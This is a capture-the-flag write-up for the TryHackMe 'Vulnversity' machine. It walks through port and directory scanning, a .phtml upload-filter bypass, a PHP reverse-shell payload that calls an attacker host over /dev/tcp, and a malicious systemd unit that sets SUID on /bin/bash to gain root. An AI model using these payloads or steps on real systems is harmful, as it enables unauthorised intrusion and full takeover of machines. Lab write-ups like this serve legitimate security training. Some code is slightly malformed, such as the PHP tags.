# Vulnversity — TryHackMe Writeup

**Target:** `TARGET_IP` (10.128.172.212 at time of solve)
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Tech stack:** vsftpd 3.0.5, OpenSSH 8.2p1, Samba 4, Squid 4.10, Apache 2.4.41 on **`:3333`**
**Exploit chain:** ferox  `internal/uploads/`  `.php` filter  `.phtml` bypass  reverse shell as `www-data`  `systemctl` allowed for `bill`  drop `/tmp/root.service` with `chmod +s /bin/bash`  `bash -p`  root

---

## Attack Chain Overview

```
nmap  21, 22, 139, 445, 3128, 3333
        
feroxbuster :3333  /internal/uploads/ (open dir listing)
        
upload form rejects .php  rename to .phtml  uploaded
        
GET /internal/uploads/shell.phtml  reverse shell (www-data)
        
su bill / find creds  systemctl allowed
        
wget /tmp/root.service { ExecStart=chmod +s /bin/bash }
systemctl enable /tmp/root.service && systemctl start root
        
/bin/bash -p  root  /root/root.txt
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Initial Access — `.phtml` Upload Bypass](#3-initial-access--phtml-upload-bypass)
4. [Foothold (`www-data`)](#4-foothold-www-data)
5. [Privilege Escalation — Systemd Unit Drop](#5-privilege-escalation--systemd-unit-drop)
6. [Key Takeaways](#6-key-takeaways)

---

## 1. Reconnaissance

```bash
# What it does: run a full port scan followed by service enumeration.
# Why here: discover the entry point on the non-standard port 3333 and other potential targets like Samba and Squid.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p21,22,445,139,3128,3333 $TARGET -oN service
```

| Port | Service |
|------|---------|
| 21/tcp | vsftpd 3.0.5 |
| 22/tcp | OpenSSH 8.2p1 |
| 139, 445/tcp | Samba 4 |
| 3128/tcp | Squid 4.10 |
| **3333/tcp** | Apache 2.4.41 — *Vuln University* |

The web app on the **non-standard port** is the entry point. See [nmap.md](../../../tools/recon/nmap.md).

---

## 2. Web Enumeration

```bash
# What it does: brute-force directories on the web server running on port 3333.
# Why here: find hidden endpoints like /internal/ which contains the vulnerable upload form.
feroxbuster -u http://$TARGET:3333 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
# /internal/              upload form
# /internal/uploads/      directory listing of past uploads (giveaway)
```

A directory listing under `/uploads/` means anything we land there is reachable by URL.

See [feroxbuster.md](../../../tools/fuzz/feroxbuster.md).

---

## 3. Initial Access — `.phtml` Upload Bypass

Full technique: [php-extension-bypass-upload.md](../../../exploits/web-rce/php-extension-bypass-upload.md).

The form filters by extension. `.php` is rejected; **`.phtml` is not**, and Apache's `mod_php` config still maps it to the PHP handler.

### 3a. Payload

```php
<php
system('bash -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"');
>
```

Save as `shell.phtml` (or rename in Burp from `shell.php` if the form accepts it).

### 3b. Upload + trigger

```bash
# What it does: set up a netcat listener to catch the reverse shell.
# Why here: receive the callback from the uploaded .phtml payload.
nc -lvnp 4444
# Upload via the form, then:
# What it does: trigger the uploaded PHP payload.
# Why here: execute the reverse shell code on the server and gain a foothold as www-data.
curl http://$TARGET:3333/internal/uploads/shell.phtml
# whoami  www-data
```

### 3c. Stabilise

```bash
# What it does: upgrade the simple shell to a fully interactive PTY.
# Why here: allow for tab completion, command history, and proper execution of interactive tools during local enumeration.
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

---

## 4. Foothold (`www-data`)

Standard [Linux enumeration](../../../playbooks/enumeration/linux.md).

```bash
# SUID sweep — empty / nothing pivots
# What it does: search for SUID binaries on the system.
# Why here: identify the systemctl binary with SUID permissions, which is the primary privilege escalation vector.
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# bill is the local user; check for creds & sudo on his behalf
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -la /home/bill
# What it does: list sudo permissions for the user bill.
# Why here: confirm that bill can execute systemctl as root without a password, enabling the systemd unit privilege escalation.
sudo -l -U bill
# (root) NOPASSWD: /bin/systemctl
```

`systemctl` allowed without a password is the privesc primitive.

---

## 5. Privilege Escalation — Systemd Unit Drop

Full technique: [systemd-service-privesc.md](../../../privesc/linux/systemd-service-privesc.md).

### 5a. Build the unit on the attacker

```ini
# root.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "chmod +s /bin/bash"

[Install]
WantedBy=multi-user.target
```

### 5b. Stage on the target

```bash
# Attacker
# What it does: executes or compiles the script/program with the specified arguments.
# Why here: launch the necessary exploit or helper in this phase.
python3 -m http.server 3333

# Target (as bill)
# What it does: changes the current directory.
# Why here: position in the necessary path for the next command.
cd /tmp
# What it does: download the malicious systemd unit file to the target.
# Why here: stage the root.service file in /tmp to be enabled and run via systemctl.
wget http://$LHOST:3333/root.service
```

### 5c. Enable + start

```bash
systemctl enable /tmp/root.service
systemctl start root
```

### 5d. Cash in

```bash
# What it does: lists directory contents.
# Why here: verificar archivos, permisos o loot en la ruta actual.
ls -l /bin/bash
# -rwsr-xr-x 1 root root … /bin/bash
# What it does: execute bash with the -p flag.
# Why here: spawn a root shell by leveraging the SUID permission set by our systemd service on /bin/bash.
/bin/bash -p
# whoami  root
# What it does: displays a file in the terminal.
# Why here: read configuration, credentials, proof or flags.
cat /root/root.txt
```

`-p` keeps the EUID intact when bash is SUID — without it, modern bash drops privileges.

---

## 6. Key Takeaways

- `.php` blacklists are usually a 30-second bypass: `.phtml`, `.phar`, `.pht`, `.php3`-`7`. Apache's stock `mods-available/php*.conf` whitelists most of them.
- A `/uploads/` directory with **directory listing on** is half the attack — visit it after every upload to grab the on-disk path.
- `sudo -l` of a local user (or `cat /etc/sudoers.d/*` from `www-data`) is the first privesc check after a foothold. NOPASSWD on `systemctl` is full root in one unit-file drop.
- `Type=oneshot` + `ExecStart=/bin/bash -c "chmod +s /bin/bash"` is the cleanest unit privesc payload — survives reboot, no listener, instant `bash -p`.
- Web on a non-standard port (`:3333`) is a recurring early-difficulty pattern; always nmap the full range, not just `-p80,443`.

---

## Related Notes
- [php-extension-bypass-upload.md](../../../exploits/web-rce/php-extension-bypass-upload.md) — initial access
- [systemd-service-privesc.md](../../../privesc/linux/systemd-service-privesc.md) — root primitive
- [linux-enumeration.md](../../../playbooks/enumeration/linux.md) — foothold playbook
- [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md), [netcat](../../../tools/pivot/netcat.md), [wget](../../../tools/web/wget.md)
